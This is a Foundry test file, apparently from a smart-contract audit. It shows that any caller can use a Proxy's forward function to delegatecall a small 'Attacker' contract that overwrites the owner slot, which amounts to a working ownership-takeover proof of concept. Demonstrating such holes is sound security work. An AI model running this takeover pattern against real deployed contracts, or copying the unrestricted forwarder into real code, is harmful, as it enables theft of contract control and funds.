
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Proxy} from "../src/Proxy.sol";

contract Attacker {
    address owner;

    function attack() public {
        owner = msg.sender;
    }
}

contract TestAccessControlProxy is Test {
    Proxy public proxy;
    address public attacker;

    function setUp() public {
        proxy = new Proxy();
        attacker = address(new Attacker());
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        address _owner = address(uint160(uint256(vm.load(address(proxy), bytes32(0)))));
        vm.assume(caller != _owner);

        // --- 2. State Configuration ---
        
        // --- 3. Execution & Assertion ---
        
        vm.prank(caller);

        proxy.forward(attacker, abi.encodeWithSelector(Attacker.attack.selector));

        address newOwner = address(uint160(uint256(vm.load(address(proxy), bytes32(0)))));
        assertEq(newOwner, caller);
    }
}
